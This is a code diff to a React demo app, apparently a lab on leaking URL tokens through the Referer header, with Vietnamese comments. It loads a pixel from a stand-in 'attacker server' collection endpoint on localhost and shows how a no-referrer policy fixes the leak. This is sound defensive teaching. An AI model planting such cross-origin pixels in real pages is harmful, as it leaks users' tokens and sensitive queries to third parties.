@@ -78,8 +78,9 @@ function Switch({ on, onToggle }){
 export default function App() {
   const { fixActive, toggle } = usePolicy()
   const [token, setToken] = useState('abc123')
-  const [query, setQuery] = useState('benh_nhay_cam')
+  const [query, setQuery] = useState('quẻy_nhay_cam')
   const [refreshKey, bump] = useState(0)
+  const [pixelNonce, setPixelNonce] = useState(0)
 
   const currentUrlWithToken = useMemo(() => {
     const url = new URL(window.location.href)
@@ -88,10 +89,15 @@ export default function App() {
   }, [token])
 
   const applyUrlWithToken = () => {
+    // Cập nhật URL của tài liệu để Referer chứa ?token=...
     window.history.replaceState({}, '', currentUrlWithToken)
+    // Buộc tải lại pixel để gửi request mới với Referer đã cập nhật
+    setPixelNonce((n) => n + 1)
+    // Làm mới bảng log để dễ thấy bản ghi mới
+    bump((k) => k + 1)
   }
 
-  const attackerPixel = `http://localhost:4000/collect.gif?from=img` // another origin
+  const attackerPixelBase = `http://localhost:4000/collect.gif?from=img` // another origin
   const attackerLanding = 'http://localhost:4000/landing'
 
   return (
@@ -123,9 +129,9 @@ export default function App() {
             <div className="stack-8">
               <div className="muted">Ảnh 1x1 từ attacker server:</div>
               {fixActive ? (
-                <img src={attackerPixel} alt="pixel" referrerPolicy="no-referrer" width={32} height={32} />
+                <img key={pixelNonce} src={`${attackerPixelBase}&t=${pixelNonce}`} alt="pixel" referrerPolicy="no-referrer" width={32} height={32} />
               ) : (
-                <img src={attackerPixel} alt="pixel" width={32} height={32} />
+                <img key={pixelNonce} src={`${attackerPixelBase}&t=${pixelNonce}`} alt="pixel" width={32} height={32} />
               )}
             </div>
             <div className="stack-8">
